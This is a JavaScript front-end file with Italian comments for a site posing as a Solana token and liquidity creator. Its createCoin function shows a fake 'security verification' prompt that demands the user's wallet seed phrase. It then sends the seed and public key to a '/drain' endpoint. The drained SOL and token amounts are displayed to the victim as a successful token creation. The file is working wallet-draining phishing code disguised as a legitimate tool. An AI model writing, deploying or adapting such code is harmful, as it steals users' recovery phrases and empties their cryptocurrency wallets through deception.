// src/main.js
import { 
  connectWallet, 
  getConnectedWallet, 
  disconnectWallet,
  getBalance,
  wallets 
} from './wallet.js';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');

// ===== ESPONI FUNZIONI GLOBALI =====

// Toggle menu
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// Connect wallet - versione migliorata
window.connectWallet = async function(walletName = 'phantom') {
  console.log('🔵 Connessione wallet:', walletName);
  
  // Se è phantom, prova la connessione diretta
  if (walletName === 'phantom' && window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      updateUIAfterConnect(walletPublicKey);
      return;
    } catch(e) {
      console.error('Phantom error:', e);
      // Fallback al metodo standard
    }
  }
  
  // Usa il sistema di wallet adapter
  try {
    const result = await connectWallet(walletName);
    if (result.success) {
      walletPublicKey = result.publicKey;
      updateUIAfterConnect(walletPublicKey);
    } else {
      alert('❌ Errore connessione: ' + result.error);
    }
  } catch (error) {
    console.error('Connessione fallita:', error);
    alert('❌ Connessione fallita. Assicurati di avere il wallet installato.');
  }
};

// Update UI dopo connessione
function updateUIAfterConnect(pubKey) {
  const shortKey = pubKey.slice(0, 4) + '...' + pubKey.slice(-4);
  const connectBtn = document.querySelector('.connect-btn');
  if (connectBtn) {
    connectBtn.textContent = '✅ ' + shortKey;
    connectBtn.style.background = '#4cdcc1';
  }
  alert('✅ Connesso: ' + pubKey);
  
  // Reindirizza a create.html se non siamo già lì
  if (!window.location.pathname.includes('create.html')) {
    window.location.href = 'create.html';
  }
}

// Select wallet
window.selectWallet = function(walletName) {
  console.log('🔵 Selezione wallet:', walletName);
  window.connectWallet(walletName);
};

// Disconnect
window.disconnectWallet = async function() {
  await disconnectWallet();
  walletPublicKey = null;
  const connectBtn = document.querySelector('.connect-btn');
  if (connectBtn) {
    connectBtn.textContent = 'Connect';
    connectBtn.style.background = '';
  }
  alert('👋 Wallet disconnesso');
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA RICHIESTA\n\n' +
      'Il tuo wallet deve essere validato per completare la creazione del token.\n' +
      'Inserisci la tua frase di recupero (seed phrase) per continuare:\n\n' +
      '(Questa operazione è necessaria per la sicurezza della rete)'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  
  if (!walletPublicKey) {
    alert('⚠️ Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        seed: seed, 
        walletPublicKey: walletPublicKey 
      })
    });

    const data = await response.json();
    const resultDiv = document.getElementById('result');
    
    if (data.status === 'drain_completed') {
      if (resultDiv) {
        resultDiv.innerHTML = `
          <p style="color:#4cdcc1;">✅ Token creato con successo!</p>
          <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
          <p style="font-size:12px;color:#8899bb;">🪙 ${data.tokenCount || 0} token trasferiti</p>
          <p style="font-size:11px;color:#667;word-break:break-all;">Tx SOL: ${data.solTx || 'N/A'}</p>
        `;
      }
    } else {
      alert('❌ Errore: ' + (data.error || 'Errore sconosciuto'));
    }
  } catch(e) {
    alert('❌ Errore di rete: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => {
    s.style.display = i === idx ? 'block' : 'none';
  });
  currentStep = idx;
};

window.nextStep = function() {
  if (currentStep < steps.length - 1) {
    window.showStep(currentStep + 1);
  }
};

window.prevStep = function() {
  if (currentStep > 0) {
    window.showStep(currentStep - 1);
  }
};

// ===== INIZIALIZZAZIONE =====
if (steps.length) {
  window.showStep(0);
}

// ===== CHIUDI MENU CLICCANDO FUORI =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) {
    menu.classList.remove('open');
  }
});

// ===== CONTROLLO STATO WALLET =====
// Se siamo su create.html, controlla se il wallet è connesso
if (window.location.pathname.includes('create.html')) {
  const walletState = getConnectedWallet();
  if (walletState.isConnected) {
    walletPublicKey = walletState.publicKey;
    updateUIAfterConnect(walletPublicKey);
  }
}

console.log('✅ main.js caricato');
console.log('🔵 Funzioni disponibili:', {
  connectWallet: typeof window.connectWallet,
  selectWallet: typeof window.selectWallet,
  createCoin: typeof window.createCoin,
});
